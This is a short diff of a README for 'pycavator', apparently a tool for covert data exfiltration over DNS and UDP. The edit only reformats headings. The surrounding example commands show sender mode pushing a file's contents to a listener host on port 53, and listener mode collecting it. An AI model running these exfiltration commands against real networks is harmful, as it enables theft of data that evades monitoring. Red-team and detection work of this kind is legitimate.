@@ -117,12 +117,12 @@ This command copies the contents of the `cert.pem` file to a new file named `ca.
 - dns.message<br/>
 - dns.resolver<br/>
 
-<b>Examples</b><br/>:
-Sender mode: exfiltrate data from a file:
+<b>Examples:</b><br/>
+<b>Sender mode: exfiltrate data from a file:</b>
 ```bash
   python pycavator-dns.py -f input.txt -s 192.168.1.101 -p 53 -d example.com -i 1 
 ```  
-Listener mode: listen for incoming data and save to a single file:
+<b>Listener mode: listen for incoming data and save to a single file:</b>
 ```bash
   python pycavator-dns.py -l -s 192.168.1.101 -p 53 -o /tmp
 ```  
@@ -130,12 +130,12 @@ Listener mode: listen for incoming data and save to a single file:
 
 ### UDP
 
-<b>Examples::</b><br/>
-Sender mode: exfiltrate data from a file:
+<b>Examples:</b><br/>
+<b>Sender mode: exfiltrate data from a file:</b>
 ```bash
 python pycavator-udp.py -f input.txt -s 192.168.1.101 -p 53 -i 1 
 ```  
-Listener mode: listen for incoming data and save to a single file:
+<b>Listener mode: listen for incoming data and save to a single file:</b>
 ```bash
 python pycavator-udp.py -l -s 192.168.1.101 -p 53 -o /tmp
 ```
